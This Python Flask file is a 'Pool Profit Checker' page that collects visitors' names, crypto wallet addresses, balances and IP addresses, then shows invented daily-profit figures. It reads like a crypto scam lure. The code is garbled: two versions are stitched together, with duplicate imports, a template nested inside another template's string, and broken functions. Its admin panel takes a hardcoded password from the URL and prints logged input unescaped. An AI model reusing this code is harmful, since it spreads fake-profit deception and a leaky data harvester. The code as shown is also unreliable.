from flask import Flask, render_template_string, request, redirect, url_for
from flask import Flask, request, render_template_string, redirect, url_for
import re
import datetime
import os
from datetime import datetime

app = Flask(__name__)

# In-memory storage (simple demo database)
users = {}
visits = []
# Simple in-memory wallet registry (demo)
REGISTERED_WALLETS = {}

# ERC20 / Ethereum wallet regex
ETH_WALLET_REGEX = r"^0x[a-fA-F0-9]{40}$"
# Admin password (change this)
ADMIN_PASSWORD = "admin123"

# HTML Template (single-file app)
HTML = """
# Ethereum wallet regex
ETH_WALLET_REGEX = re.compile(r"^0x[a-fA-F0-9]{40}$")

VISITOR_LOG = "visitors.log"


def log_visitor(wallet, ip):
    with open(VISITOR_LOG, "a") as f:
        f.write(f"{datetime.datetime.now()} | {wallet} | {ip}\n")


HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Pooldata</title>
    <title>Pooldata - Daily Profit</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <style>
        body { font-family: Arial; background:#0f172a; color:white; text-align:center; }
        .box { background:#1e293b; padding:20px; width:400px; margin:auto; border-radius:10px; }
        input, button { width:90%; padding:10px; margin:8px; border-radius:6px; border:none; }
        button { background:#38bdf8; font-weight:bold; cursor:pointer; }
        .error { color:#f87171; }
        .success { color:#4ade80; }
        img { width:120px; border-radius:50%; margin-bottom:10px; }
        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            background: url('/static/bg.png') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
            color: #fff;
        }

        .overlay {
            background: rgba(0,0,0,0.7);
            min-height: 100vh;
            padding: 30px;
        }

        .box {
            max-width: 420px;
            margin: auto;
            background: rgba(0,0,0,0.85);
            padding: 25px;
            border-radius: 10px;
        }

        input, button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
        }

        button {
            background: orange;
            font-weight: bold;
            cursor: pointer;
        }

        .error {
            color: red;
            margin-top: 10px;
        }

        .success {
            color: lightgreen;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="box">
    <img src="https://i.imgur.com/9QeQF5G.png">
    <h2>Pool Profit Checker</h2>

    {% if message %}
        <p class="{{ status }}">{{ message }}</p>
    {% endif %}

    <form method="POST">
        <input type="text" name="name" placeholder="Your Name" required>
        <input type="text" name="wallet" placeholder="ERC20 Wallet Address" required>
        <input type="number" step="0.01" name="balance" placeholder="Wallet Balance (USD)" required>
        <button type="submit">Check Profit</button>
    </form>

    {% if profit %}
        <hr>
        <p><b>Name:</b> {{ name }}</p>
        <p><b>Wallet:</b> {{ wallet }}</p>
        <p><b>Balance:</b> ${{ balance }}</p>
        <p><b>Daily Profit Rate:</b> {{ rate }}%</p>
        <p><b>Daily Profit:</b> ${{ profit }}</p>
    {% endif %}
<body>
<div class="overlay">
    <div class="box">
        <h2>Daily Profit Checker</h2>

        <form method="POST">
            <input type="text" name="wallet" placeholder="Enter ERC20 Wallet Address">
            <button type="submit">Check Profit</button>
        </form>

        {% if error %}
            <div class="error">{{ error }}</div>
        {% endif %}

        {% if profit %}
            <div class="success">
                <p><b>Wallet:</b> {{ wallet }}</p>
                <p><b>Today's Profit:</b> {{ profit }} USDT</p>
            </div>
        {% endif %}
    </div>
</div>

</body>
</html>
"""


@app.route("/", methods=["GET", "POST"])
def home():
    message = None
    status = None
def index():
    error = None
    profit = None
    wallet = None

    if request.method == "POST":
        name = request.form["name"].strip()
        wallet = request.form["wallet"].strip()
        balance = float(request.form["balance"])

        # Log visit
        visits.append({
            "name": name,
            "wallet": wallet,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })

        # Wallet validation
        if not re.match(ETH_WALLET_REGEX, wallet):
            return render_template_string(HTML, message="Invalid wallet address.", status="error")

        if balance <= 0:
            return render_template_string(HTML, message="Wallet has 0 balance.", status="error")

        # Lock wallet to user
        if name in users and users[name] != wallet:
            return render_template_string(HTML, message="Wallet mismatch. Use your registered wallet.", status="error")

        users[name] = wallet

        # Profit rate logic
        if balance < 5000:
            rate = 2
        elif balance <= 10000:
            rate = 2.5
        wallet = request.form.get("wallet", "").strip()

        if not wallet:
            error = "Please provide a wallet address."
        elif not ETH_WALLET_REGEX.match(wallet):
            error = "Invalid wallet address format."
        else:
            rate = 3
            ip = request.remote_addr
            log_visitor(wallet, ip)

            # Register wallet if first time
            if ip not in REGISTERED_WALLETS:
                REGISTERED_WALLETS[ip] = wallet
            else:
                if REGISTERED_WALLETS[ip] != wallet:
                    error = "You must use the same wallet address as registered."
                    return render_template_string(HTML_TEMPLATE, error=error)

        profit = round(balance * rate / 100, 2)
            # Demo profit logic
            profit = round((int(wallet[-4:], 16) % 500) / 10, 2)

        return render_template_string(
            HTML,
            name=name,
            wallet=wallet,
            balance=balance,
            rate=rate,
            profit=profit,
            message="Profit calculated successfully.",
            status="success"
        )
    return render_template_string(
        HTML_TEMPLATE,
        error=error,
        profit=profit,
        wallet=wallet
    )

    return render_template_string(HTML)

# Admin panel
@app.route("/admin")
def admin():
    password = request.args.get("password")
    if password != "admin123":
        return "Unauthorized"

    output = "<h2>Visitors</h2><ul>"
    for v in visits:
        output += f"<li>{v['time']} - {v['name']} - {v['wallet']}</li>"
    output += "</ul>"
    return output
    if password != ADMIN_PASSWORD:
        return "Unauthorized", 401

    if not os.path.exists(VISITOR_LOG):
        return "No visitors yet."

    with open(VISITOR_LOG) as f:
        logs = f.read().replace("\n", "<br>")

    return f"<h2>Visitor Log</h2><hr>{logs}"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
    app.run(host="0.0.0.0", port=5000)
